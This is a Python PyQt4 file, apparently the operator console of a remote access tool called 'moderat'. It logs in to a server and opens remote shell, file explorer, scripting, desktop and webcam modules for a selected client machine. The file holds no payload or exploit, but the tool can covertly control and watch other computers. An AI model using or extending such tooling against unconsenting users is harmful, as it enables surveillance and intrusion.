from PyQt4.QtGui import *
from PyQt4.QtCore import *
import os
import string
import random

from libs.language import Translate
from libs.gui import main

from modules.mexplorer import main as mexplorer
from modules.mshell import main as mshell
from modules.mprocesses import main as mprocesses
from modules.mscript import main as mscript
from modules.mdesktop import main as mdesktop
from modules.mwebcam import main as mwebcam


# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class Actions:
    def __init__(self, moderat):
        self.moderat = moderat

        # Create Main UI Functions
        self.ui = main.updateUi(self.moderat)

    def login(self):
        '''
        login to server
        :return:
        '''
        self.moderat.session_id = id_generator(size=24)
        username, ok = QInputDialog.getText(self.moderat, _('UNLOCK_CLIENT'), _('ENTER_USERNAME'), QLineEdit.Normal)
        if ok:
            password, ok = QInputDialog.getText(self.moderat, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD'),
                                                QLineEdit.Password)
            if ok:
                self.moderat.moderator.send_msg('auth %s %s' % (username, password), 'moderatorInitializing',
                                                session_id=self.moderat.session_id)
            else:
                self.ui.on_moderator_connected()
        else:
            self.ui.on_moderator_not_connected()

    def disconnect(self):
        '''
        disconnected from server
        :return:
        '''
        # Stop Clients Checker
        if self.moderat.clients_checker:
            if self.moderat.clients_checker.isActive():
                self.moderat.clients_checker.stop()
        # Stop Moderators Checker
        if self.moderat.moderators_checker:
            if self.moderat.moderators_checker.isActive():
                self.moderat.moderators_checker.stop()
        # Stop Connection
        if self.moderat.connection:
            self.moderat.connection.disconnect()
        # Update GUI
        self.ui.on_moderator_not_connected()
        self.ui.clear_tables()

    def set_alias(self):
        '''
        Set Alias For Client
        :return:
        '''
        client = self.current_client()
        if client:
            text, ok = QInputDialog.getText(self.moderat, _('ALIAS_SET'), _('ALIAS_NAME'))
            if ok:
                self.moderat.moderator.send_msg('%s %s' % (client, str(text)), 'setAlias',
                                                session_id=self.moderat.session_id)

    def execute_module(self, module):
        modules = {
            'shell': mshell,
            'explorer': mexplorer,
            'scripting': mscript,
            'desktop': mdesktop,
            'webcam': mwebcam,
        }

        client = self.current_client()
        if client:
            module_id = id_generator()
            args = {
                'moderator': self.moderat.moderator,
                'client': client,
                'session_id': self.moderat.session_id,
                'assets': self.moderat.assets,
                'plugins': self.moderat.plugins,
                'module_id': module_id,
            }
            if module in modules:
                self.moderat.modulesBank[module_id] = modules[module].mainPopup(args)
                self.moderat.modulesBank[module_id].show()

    # get online client
    def current_client(self):
        try:
            return str(self.moderat.clientsTable.item(self.moderat.clientsTable.currentRow(), 3).text())
        except AttributeError:
            return False

    # get offline client
    def current_offline_client(self):
        try:
            return str(self.moderat.offlineClientsTable.item(self.moderat.offlineClientsTable.currentRow(), 2).text())
        except AttributeError:
            return False

    def close_moderat(self):
        # Stop Clients Checker
        if self.moderat.clients_checker:
            if self.moderat.clients_checker.isActive():
                self.moderat.clients_checker.stop()
        # Stop Moderators Checker
        if self.moderat.moderators_checker:
            if self.moderat.moderators_checker.isActive():
                self.moderat.moderators_checker.stop()
        os._exit(0)
